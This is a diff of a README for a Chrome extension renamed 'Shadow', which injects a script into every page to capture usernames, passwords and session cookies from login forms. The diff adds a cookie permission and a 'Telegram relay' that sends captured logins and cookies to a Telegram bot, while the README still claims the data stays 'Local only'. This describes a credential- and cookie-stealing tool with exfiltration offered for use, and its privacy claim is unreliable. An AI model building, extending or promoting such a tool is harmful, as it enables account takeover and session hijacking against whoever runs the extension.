@@ -1,14 +1,18 @@
-# Login Credentials Saver – Chrome Extension
+# Shadow – Chrome Extension
 
-A Chrome extension that saves the username and password you enter on any website when a login succeeds. View and copy saved credentials on a dedicated page, opened by keyboard shortcut or by clicking the extension icon.
+Shadow captures usernames, passwords, and cookies from login forms so you can retrieve them anytime. Open the credentials page with a keyboard shortcut or by clicking the extension icon.
+
+![Shadow credentials page](docs/shadow-ui.png)
 
 ## Features
 
-- **Auto-save on success** – Saves credentials only when the login succeeds (after the page navigates away from the login form).
-- **Credentials page** – No popup; credentials are shown on a full page in a new tab.
-- **Keyboard shortcut** – Press **Ctrl+Shift+L** (Windows/Linux) or **Cmd+Shift+L** (Mac) to open the saved credentials page. You can change it at `chrome://extensions/shortcuts`.
+- **Auto-save on success** – Saves credentials when a login form is submitted (and attaches cookies after navigation when possible).
+- **Credentials page** – Full-page UI (vintage desktop style) to browse, search, and copy saved logins.
+- **Pagination** – Browse long lists in pages of 20.
+- **Keyboard shortcut** – Press **Ctrl+Shift+H** (Windows/Linux) or **Cmd+Shift+H** (Mac) to open Shadow. Change it at `chrome://extensions/shortcuts`.
 - **Or click the icon** – Clicking the extension icon also opens the credentials page.
-- **Copy to clipboard** – Use the “Copy” buttons next to username or password on the credentials page.
+- **Copy to clipboard** – Copy passwords and cookies from the credentials page.
+- **Telegram relay** – Optionally send new logins (and cookies) to a Telegram bot.
 - **Local only** – Data is stored in Chrome’s local storage on this device only (not synced to your Google account).
 
 ## Installation (developer / unpacked)
@@ -16,13 +20,13 @@ A Chrome extension that saves the username and password you enter on any website
 1. Open Chrome and go to `chrome://extensions/`.
 2. Turn on **Developer mode** (top-right).
 3. Click **Load unpacked**.
-4. Select the folder that contains this project (e.g. `keylogging-extension`).
-5. Use **Ctrl+Shift+L** (or **Cmd+Shift+L** on Mac) to open the credentials page, or click the extension icon.
+4. Select this project folder (`shadow`).
+5. Use **Ctrl+Shift+H** (or **Cmd+Shift+H** on Mac) to open Shadow, or click the extension icon.
 
 ## How it works
 
-- The extension injects a script on every page. When you submit a login form, it stores the credentials as “pending.”
-- If the site then navigates to another page (e.g. dashboard), the extension treats that as a successful login and moves the pending entry into the saved list.
+- The extension injects a script on every page. When you submit a login form, it stores the credentials.
+- After navigation on the same origin, Shadow tries to attach cookies to that entry.
 - Saved entries are shown on the credentials page (`credentials.html`). Use **Clear all** there to remove everything.
 
 ## Security notice
@@ -34,11 +38,12 @@ A Chrome extension that saves the username and password you enter on any website
 ## Permissions
 
 - **Storage** – To save and read credentials locally.
-- **Access to all websites** – So the extension can run on any page and capture login forms when you submit them.
+- **Cookies** – To capture session cookies after a login.
+- **Access to all websites** – So Shadow can run on any page and capture login forms when you submit them.
 
 ## Files
 
 - `manifest.json` – Extension manifest (Manifest V3), including keyboard command.
-- `background.js` – Opens the credentials page when you use the shortcut or click the icon.
-- `content.js` – Runs on web pages; captures form submit and promotes to saved on successful login.
+- `background.js` – Opens the credentials page; Telegram relay; cookie attach.
+- `content.js` – Runs on web pages; captures form submit and requests cookie attach.
 - `credentials.html` / `credentials.css` / `credentials.js` – Full-page UI to list and copy saved credentials.
